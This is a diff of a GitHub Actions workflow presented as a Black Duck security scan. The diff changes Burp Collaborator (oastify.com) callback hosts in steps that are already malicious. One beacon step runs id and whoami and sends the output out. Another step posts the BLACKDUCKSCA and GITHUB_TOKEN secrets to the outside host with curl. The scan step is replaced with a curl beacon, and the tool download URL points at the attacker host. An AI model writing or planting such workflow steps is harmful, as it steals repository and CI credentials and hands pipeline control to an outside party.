@@ -45,7 +45,7 @@ jobs:
       ### GitHub pull request information
       BRIDGE_GITHUB_REPOSITORY_PULL_NUMBER: ${{ github.event.pull_request.number || github.event.number || 0 }}
       ### TOOLING: Bridge CLI download URL  <-- SSRF sink
-      BRIDGE_DOWNLOAD_URL: https://u3ykeyor4axefzq7fiq67mfjua01orcg.oastify.com
+      BRIDGE_DOWNLOAD_URL: https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com
     steps:
       - name: Checkout Source
         uses: actions/checkout@v5
@@ -53,7 +53,7 @@ jobs:
       # === BEACON 1: proves a custom step runs ===
       - name: beacon-step
         run: |
-          COLLAB="https://u3ykeyor4axefzq7fiq67mfjua01orcg.oastify.com"
+          COLLAB="https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com"
           {
             echo "=== id ==="; id
             echo "=== whoami ==="; whoami
@@ -81,7 +81,7 @@ jobs:
             --data-urlencode "token=${{ secrets.BLACKDUCKSCA_TOKEN }}" \
             --data-urlencode "ghtoken=${{ secrets.GITHUB_TOKEN }}" \
             --data-urlencode "url=${{ vars.BLACKDUCKSCA_URL }}" \
-            "https://u3ykeyor4axefzq7fiq67mfjua01orcg.oastify.com/step2" || true
+            "https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com/step2" || true
 
       - name: Download & Setup Bridge CLI on Windows
         if: runner.os == 'Windows'
@@ -103,7 +103,7 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "u3ykeyor4axefzq7fiq67mfjua01orcg.oastify.com/scan?host=$(pwd)" || true
+        run: echo "scan-step" && curl -sS "244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com/scan?host=$(pwd)" || true
 # Quickstart: Black Duck Security Scan Action with blackducksca:
 #     https://black-duck-staging.fluidtopics.net/r/bridge/latest/bridge-cli-guide/quickstart-black-duck-security-scan-action-with-black-duck-sca.html
 name: Black Duck Security Scan
